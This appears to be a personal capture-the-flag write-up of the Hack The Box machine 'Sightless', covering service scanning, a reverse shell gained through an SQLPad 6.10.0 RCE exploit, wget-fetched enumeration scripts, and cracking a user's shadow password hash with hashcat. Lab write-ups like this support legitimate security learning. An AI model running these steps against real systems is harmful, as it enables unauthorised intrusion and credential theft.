# Enumeration

```
nmap -sV --open -oA sightless_initial_scan 10.10.11.32
nmap -p- --open -oA sightless_full_tcp_scan 10.10.11.32
```

```
# Nmap 7.95 scan initiated Sat Sep 28 14:46:49 2024 as: nmap -sV --open -oA sightless_initial_scan 10.10.11.32
Nmap scan report for 10.10.11.32
Host is up (0.058s latency).
Not shown: 951 closed tcp ports (conn-refused), 46 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.95%I=7%D=9/28%Time=66F84F36%P=x86_64-apple-darwin21.6.0%
SF:r(GenericLines,A0,"220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\
SF:x20Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\
SF:x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20tr
SF:y\x20being\x20more\x20creative\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 28 14:47:36 2024 -- 1 IP address (1 host up) scanned in 47.11 seconds
```

```
nc -nv 10.10.11.32 21
10.10.11.32 21 (ftp) open

nc -nv 10.10.11.32 22
10.10.11.32 22 (ssh) open
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10

nc -nv 10.10.11.32 80
10.10.11.32 80 (http) open
```

```
nmap -sC -p 21,22,80 -oA sightless_script_scan 10.10.11.32
```

Nothing new there.

```
nmap -sV --script=http-enum -oA sightless_nmap_http_enum 10.10.11.32 
```

Again nothing new.

Added to the etc hosts file.

Opening the webpage I see this in the source:

``` html
 <p>SQLPad is a web app that lets users connect to various SQL servers via a browser. Click "Start Now" to try a demo!</p>
                <p style="text-align: center;">
                <a class="button" href="http://sqlpad.sightless.htb/"> Start Now</a>

```

Adding to the /etc/hosts


Opening the page it seems to allow SQL queries.

But I need to make a connection to the sql server. Which I don't know the connection string...

The version of SQL Pad:  Version: 6.10.0

This has an RCE vuln.

Getting a copy of the RCE is easy. And now I have a foothold.

`nc -nvlp 4000`
`python3 exploit.py http://sqlpad.sightless.htb:80 10.10.14.73 4000`

# Foothold

So it connects me as root... but I am not seeing anything.

Maybe I need to connect with SSH

Nope, neither root nor michael have a .ssh to copy

Get linpeas on the machine.

My machine:
`python3 -m http.server 8001`

Target machine:
`wget http://10.10.14.98:8001/linpeas.sh `


Results:
michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::

```
hashcat hash.txt /Users/noneya/Useful/Wordlists/rockyou.txt

$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:insaneclownposse
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa....L2IJD/
```
I can SSH now.

That gets me User. Now for priv esc

# Priv esc

Run linpeas again after running this again:

My machine:
`python3 -m http.server 8001`

Target machine:
`wget http://10.10.14.98:8001/linpeas.sh `

Was lost, found the answer online... https://thecybersecguru.com/ctf-walkthroughs/mastering-sightless-beginners-guide-from-hackthebox/

But didn't root the box because thats not fair
